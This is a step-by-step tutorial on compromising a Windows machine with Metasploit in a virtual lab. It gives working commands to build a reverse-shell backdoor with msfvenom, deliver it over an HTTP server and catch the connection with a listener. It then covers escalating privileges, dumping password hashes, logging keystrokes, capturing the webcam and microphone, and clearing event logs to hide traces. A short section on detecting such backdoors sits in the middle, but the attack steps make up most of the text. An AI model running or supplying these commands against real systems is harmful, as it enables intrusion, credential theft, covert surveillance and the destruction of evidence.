### **Hacking Windows Using Metasploit / Meterpreter - Post-Exploitation**
This guide will take you through setting up a controlled environment, exploiting a Windows machine, and performing post-exploitation tasks using Metasploit and Meterpreter.

---

## **🔹 Step 1: Set Up Your Lab**
To ensure a safe hacking environment, we will use virtual machines.

### **Requirements**
- **Kali Linux VM** (Attacker)
- **Windows VM** (Target)
- **Virtualization software**: VMware or VirtualBox
- **Network Mode**: Ensure both machines are on the same NAT or Host-Only Network.

---

## **🔹 Step 2: Generate a Malicious Payload**
We will create a malicious backdoor using **msfvenom**, which generates a reverse shell.

### **Open a terminal in Kali Linux and run:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your Kali IP> LPORT=4444 -f exe > backdoor.exe
```
- Replace `<Your Kali IP>` with the IP address of your Kali machine.
- The **LPORT** (Listening Port) is set to **4444** (you can change it).

### **Transfer the payload to the Windows VM**
Use one of these methods:
1. **Python HTTP Server** (Fastest way)
   ```bash
   python3 -m http.server 8080
   ```
   On the Windows machine, open a browser and download the payload:
   ```
   http://<Kali IP>:8080/backdoor.exe
   ```
2. **USB or Shared Folder** (If allowed in VM settings)

---

## **🔹 Step 3: Start a Metasploit Listener**
Launch Metasploit on Kali:
```bash
msfconsole
```
Set up the listener:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <Your Kali IP>
set LPORT 4444
exploit
```
This will wait for the Windows machine to execute `backdoor.exe`.

---

## **🔹 Step 4: Exploit the Windows 10 Machine**
On the Windows VM:
1. **Run the payload** (`backdoor.exe`).
2. **Check the Kali terminal** – A Meterpreter session should open.

Confirm the session:
```bash
sessions -i
```

---

## **🔹 Step 5: Post-Exploitation**
Now that we have access, we can explore the Windows machine.

### **1️⃣ Check System Info**
```bash
sysinfo
```

### **2️⃣ Get User Privileges**
```bash
getuid
```

### **3️⃣ Escalate Privileges (If Needed)**
```bash
run post/windows/escalate/getsystem
```

### **4️⃣ Dump Password Hashes**
```bash
hashdump
```

### **5️⃣ Enable Keylogging**
```bash
keyscan_start
```
Retrieve keystrokes:
```bash
keyscan_dump
```

### **6️⃣ Capture Webcam**
```bash
webcam_snap
```

### **7️⃣ Record Microphone Audio**
```bash
record_mic -d 10
```
(Records for 10 seconds)

---

## **🔹 Step 6: Detect & Prevent Backdoors**
After testing, it's important to analyze how to detect such attacks.

### **1️⃣ Check Active Network Connections**
On Windows:
```powershell
netstat -ano
```
- Look for **suspicious connections to your Kali machine's IP**.

### **2️⃣ Identify Running Malicious Processes**
```powershell
tasklist /v
```
- Look for unusual processes (e.g., `backdoor.exe`).

### **3️⃣ Scan for Persistence Mechanisms**
Check **Registry Startup Entries**:
```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Check **Scheduled Tasks**:
```powershell
schtasks /query /fo LIST /v
```

### **4️⃣ Detect File Changes**
Run this in PowerShell:
```powershell
Get-EventLog -LogName Security -Newest 50
```

### **5️⃣ Use Windows Defender & Antivirus**
To remove the payload:
```powershell
del C:\Users\Public\backdoor.exe
```
Run a Defender scan:
```powershell
Start-MpScan -ScanType QuickScan
```

---

## **🔹 Step 7: Clean Up the Attack**
If you want to clear your traces:
1. **Clear Event Logs**
   ```bash
   meterpreter > clearev
   ```
2. **Kill the process**
   ```bash
   ps
   kill <PID>
   ```
3. **Exit Meterpreter**
   ```bash
   exit
   ```
